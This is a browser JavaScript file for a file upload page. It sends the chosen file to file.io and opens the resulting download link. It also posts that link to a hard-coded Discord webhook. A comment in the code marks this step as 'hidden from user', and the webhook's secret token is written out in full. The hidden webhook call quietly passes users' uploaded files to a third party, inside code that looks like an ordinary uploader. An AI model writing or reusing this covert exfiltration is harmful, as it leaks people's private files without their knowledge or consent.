const fileInput = document.getElementById('fileInput');
const uploadButton = document.getElementById('uploadButton');
const webhookUrl = 'https://ptb.discord.com/api/webhooks/1292501408746180678/SbDR8QTAt2uIl85-qPohWU7jt_nhSaI9eGJXx-LWhXxbgaV1lrikWlXcLK1XBoNO4yaX';
const maxFileSize = 1024 * 1024 * 100; // 100MB
const uploadTimeout = 30000; // 30 seconds

uploadButton.addEventListener('click', async () => {
  const file = fileInput.files[0];

  if (!file) {
    alert('Please select a file to upload.');
    return;
  }

  if (file.size > maxFileSize) {
    alert('File size exceeds the maximum limit of 100MB.');
    return;
  }

  const formData = new FormData();
  formData.append('file', file);

  try {
    const response = await fetch('https://file.io/', {
      method: 'POST',
      body: formData,
      timeout: uploadTimeout,
      headers: {
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'application/json',
        'Content-Type': 'multipart/form-data',
      },
    });

    if (!response.ok) {
      throw new Error(`HTTP Error: ${response.status}`);
    }

    const responseJson = await response.json();
    if (!responseJson.link) {
      throw new Error('Failed to extract download link from File.io response');
    }

    const downloadLink = responseJson.link;
    console.log('File.io response:', downloadLink); // Debug download link

    // Open download link in new tab
    const newTab = window.open(downloadLink, '_blank');
    newTab.focus();

    // Send download link to webhook (hidden from user)
    try {
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `New file uploaded: ${downloadLink}`,
        }),
      });

      if (!response.ok) {
        throw new Error(`Webhook Error: ${response.status}`);
      }

      console.log('Webhook notification sent successfully'); // Log webhook success
    } catch (error) {
      console.error('Error sending webhook notification:', error); // More detailed logging for debugging
    }
  } catch (error) {
    console.error('Error uploading file:', error); // More detailed logging for debugging
    alert('Failed to upload file.');
  }
});

// Add event listener for file input changes
fileInput.addEventListener('change', () => {
  const file = fileInput.files[0];

  if (file) {
    console.log('File selected:', file.name); // Log file selection
  }
});

// Add event listener for upload button hover
uploadButton.addEventListener('mouseover', () => {
  console.log('Upload button hovered'); // Log upload button hover
});

// Add event listener for upload button click
uploadButton.addEventListener('click', () => {
  console.log('Upload button clicked'); // Log upload button click
});
